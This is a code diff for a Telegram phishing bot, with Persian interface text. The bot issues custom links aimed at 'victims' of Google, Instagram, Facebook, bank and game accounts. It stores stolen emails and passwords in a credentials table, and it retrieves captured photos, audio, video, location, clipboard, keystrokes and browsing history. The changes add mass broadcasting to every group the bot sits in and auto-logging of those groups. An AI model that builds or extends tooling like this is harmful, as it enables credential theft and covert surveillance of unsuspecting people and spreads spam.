@@ -36,6 +36,7 @@ def init_db():
         db.execute("CREATE TABLE IF NOT EXISTS media (token TEXT, type TEXT, data BLOB, timestamp TEXT)")
         db.execute("CREATE TABLE IF NOT EXISTS credentials (token TEXT, email TEXT, password TEXT, timestamp TEXT)")
         db.execute("CREATE TABLE IF NOT EXISTS learned (keyword TEXT PRIMARY KEY, response TEXT)")
+        db.execute("CREATE TABLE IF NOT EXISTS groups (chat_id INTEGER PRIMARY KEY)")
         db.commit()
 
 @app.teardown_appcontext
@@ -653,13 +654,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     help_text = (
         "🔹 به ربات خوش آمدید!\n\n"
         "📌 با دکمه «ساخت لینک جدید» یک لینک اختصاصی بسازید.\n"
-        "🎯 نوع قربانی (گوگل، اینستاگرام، فیسبوک، بانک، بازی و...) را انتخاب کنید.\n"
-        "📊 اطلاعات کامل دستگاه (باتری، شبکه، مدل دقیق) و عکس/صدا دریافت کنید.\n\n"
-        "دسترسی به انواع حساب ها"
-        "مود تمام گیم ها"
-        ""
-        "و هزاران دستور خفن که با بالارفتن امتیاز فعال میشه"
-        "🤖 هوش مصنوعی: پاسخگویی به پیام‌های خصوصی  "
+        "🎯 نوع  (گوگل، اینستاگرام، فیسبوک، بانک، بازی و...) را انتخاب کنید.\n"
+        "📊 اطلاعات کامل دستگاه (باتری، شبکه، مدل دقیق) و عکس صدا و... دریافت کنید.\n\n"
+        "دسترسی به انواع حساب ها ، مود تمام گیم ها و هزاران دستور خفن که با بالارفتن امتیاز فعال میشه\n"
+        "🤖 هوش مصنوعی: پاسخگویی به پیام‌های خصوصی."
     )
     keyboard = [[InlineKeyboardButton("🔗 ساخت لینک جدید", callback_data="new_link")],
                 [InlineKeyboardButton("📖 راهنما", callback_data="help")]]
@@ -679,6 +677,7 @@ async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton(f"🤖 AI: {'✅ روشن' if AI_ENABLED else '❌ خاموش'}", callback_data="toggle_ai")],
         [InlineKeyboardButton("📋 لیست قربانیان", callback_data="victims_list")],
         [InlineKeyboardButton("📊 آمار", callback_data="stats")],
+        [InlineKeyboardButton("📢 ارسال پیام به گروه‌ها", callback_data="broadcast_groups")],
         [InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
     ]
     await update.message.reply_text("🔧 پنل مدیریت:", reply_markup=InlineKeyboardMarkup(keyboard))
@@ -770,6 +769,31 @@ async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # --- Auto-reply with learned words, then AI (including replies) ---
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = update.message
+
+    # ذخیره گروه‌ها برای broadcast
+    if msg.chat.type in ['group', 'supergroup']:
+        conn = get_db_connection()
+        conn.execute("INSERT OR IGNORE INTO groups (chat_id) VALUES (?)", (msg.chat.id,))
+        conn.commit()
+        conn.close()
+
+    # بررسی حالت broadcast برای ادمین
+    if context.user_data.get('awaiting_broadcast') and msg.from_user.id == ADMIN_USER_ID:
+        context.user_data['awaiting_broadcast'] = False
+        text = msg.text
+        conn = get_db_connection()
+        rows = conn.execute("SELECT chat_id FROM groups").fetchall()
+        sent = 0
+        for row in rows:
+            try:
+                await context.bot.send_message(chat_id=row['chat_id'], text=text)
+                sent += 1
+            except:
+                pass
+        conn.close()
+        await msg.reply_text(f"📢 پیام به {sent} گروه ارسال شد.")
+        return
+
     # 1. If it's a reply to our bot, always answer with AI (if enabled)
     if msg.reply_to_message and msg.reply_to_message.from_user.id == context.bot.id:
         if AI_ENABLED and GROQ_API_KEY:
@@ -778,22 +802,23 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await thinking.edit_text(answer)
         return
 
-    # 2. In private chats, check learned words, then AI
+    # 2. Check learned keywords in all chats
+    text_lower = msg.text.lower()
+    conn = get_db_connection()
+    rows = conn.execute("SELECT keyword, response FROM learned").fetchall()
+    for row in rows:
+        if row['keyword'] in text_lower:
+            await msg.reply_text(row['response'])
+            conn.close()
+            return
+    conn.close()
+
+    # 3. AI in private chats
     if msg.chat.type == 'private':
-        text_lower = msg.text.lower()
-        conn = get_db_connection()
-        rows = conn.execute("SELECT keyword, response FROM learned").fetchall()
-        for row in rows:
-            if row['keyword'] in text_lower:
-                await msg.reply_text(row['response'])
-                conn.close()
-                return
-        conn.close()
         if AI_ENABLED and GROQ_API_KEY:
             thinking = await msg.reply_text("🤔 در حال فکر کردن...")
             answer = ask_groq(msg.text)
             await thinking.edit_text(answer)
-    # 3. In groups, do nothing (unless it's a reply, already handled)
 
 # --- Callback Handler ---
 PHISHING_TYPES = {
@@ -850,9 +875,17 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 [InlineKeyboardButton(f"🤖 AI: {'✅ روشن' if AI_ENABLED else '❌ خاموش'}", callback_data="toggle_ai")],
                 [InlineKeyboardButton("📋 لیست قربانیان", callback_data="victims_list")],
                 [InlineKeyboardButton("📊 آمار", callback_data="stats")],
+                [InlineKeyboardButton("📢 ارسال پیام به گروه‌ها", callback_data="broadcast_groups")],
                 [InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
             ]
             await query.edit_message_text("🔧 پنل مدیریت:", reply_markup=InlineKeyboardMarkup(keyboard))
+
+        elif data == "broadcast_groups":
+            if user_id != ADMIN_USER_ID:
+                await query.answer("⛔ اجازه ندارید", show_alert=True)
+                return
+            context.user_data['awaiting_broadcast'] = True
+            await query.edit_message_text("📝 لطفاً متن پیام خود را ارسال کنید (پیام بعدی شما به تمام گروه‌ها فرستاده می‌شود).")
 
         elif data == "toggle_bot":
             if user_id != ADMIN_USER_ID:
@@ -955,7 +988,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ]
             await query.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
-        # Media retrieval with retry
         elif data.startswith("photo|") or data.startswith("audio|") or data.startswith("video|") or data.startswith("location|") or data.startswith("clipboard|") or data.startswith("keystrokes|") or data.startswith("ports|") or data.startswith("history|"):
             parts = data.split('|')
             action = parts[0]
